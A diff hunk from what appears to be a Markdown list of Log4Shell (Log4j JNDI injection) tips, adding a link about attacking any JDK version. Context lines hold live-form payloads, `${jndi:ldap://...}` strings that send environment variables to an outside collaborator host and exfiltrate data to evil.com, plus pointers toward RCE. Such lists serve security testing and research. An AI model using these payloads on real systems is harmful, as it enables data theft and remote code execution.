@@ -64,6 +64,7 @@ Term | Description
 - [The Log4J formatting is nestable which means payloads like `${jndi:ldap://${env:user}.xyz.collab.com/a}` will leak server side env vars](https://twitter.com/_StaticFlow_/status/1469358229767475205)
 - [Tutorial on setting up RogueJDNI](https://twitter.com/ITSecurityguard/status/1469347404986077185)
 - [Class path is useful information to have to know what gadgets should be available or where you need to look for some to get rce.](https://twitter.com/jstnkndy/status/1469752457618202624)
+- [How to attack any JDK version for log4j "without" guessing classpath on server?](https://twitter.com/aaditya_purani/status/1470487281572237312)
 - [Some events are only logged when an exception occur, so specially long payloads with unexpected characters may help you trigger those exceptions.](https://twitter.com/pwntester/status/1470435811812380675)
 - [If you omit the closing brace `}` (so the payload would look like `${jndi:ldap://evil.com/`), you will potentially get a bunch of data exfiltrated to your server until the next `}` appears in that data](https://twitter.com/TomAnthonySEO/status/1470374984749133825)
 - [Attack path works in *ANY* java version](https://twitter.com/marcioalm/status/1470361495405875200)
